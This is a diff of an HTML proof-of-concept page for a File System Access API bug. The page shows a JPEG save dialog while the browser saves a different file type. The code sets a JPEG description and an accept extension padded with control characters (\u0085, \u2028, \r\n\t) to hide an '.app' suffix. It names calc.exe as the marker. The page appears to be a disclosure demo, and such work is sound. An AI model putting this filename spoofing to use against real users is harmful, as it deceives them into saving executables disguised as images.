@@ -3,23 +3,17 @@
 
 <head>
     <meta charset="utf-8">
-    <title>File System Access API - save As JPEG executable</title>
+    <title>File System Access API</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="icon" type="image/x-icon" href="favicon.png">
 </head>
 
 <body>
-    <h3>File System Access API - Save shows saving as JPEG, however, download as an executable exe + spoof filename with
-        RTL character</h3>
-    <h4>Found by Maciej Pulikowski - maciekpul@gmail.com</h4>
+    <h3>File System Access API </h3>
 
-    <hr>
-    <h3>Gif example/proof:</h3>
-    <a href="rtltrick.gif" target="_blank">GIF URL</a>
     <hr>
     <h3>Code example/proof:</h3>
     <div style="display: flex; flex-direction: column">
-        <img src="cat.jpg" alt="awesome cat" width="500" height="600">
         <div>
             <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save image</button>
         </div>
@@ -35,7 +29,7 @@
                         description:
                             'JPEG Image (*.jpeg)',
                         accept: {
-                            'text/plain': ['.\u0085\u2028\r\n\t.app']
+                            'text/plain': ['.\u0085\u2028\r\n\tsss.www.app']
                         },
                         content: 'C:\\Windows\\system32\\calc.exe'
                     }
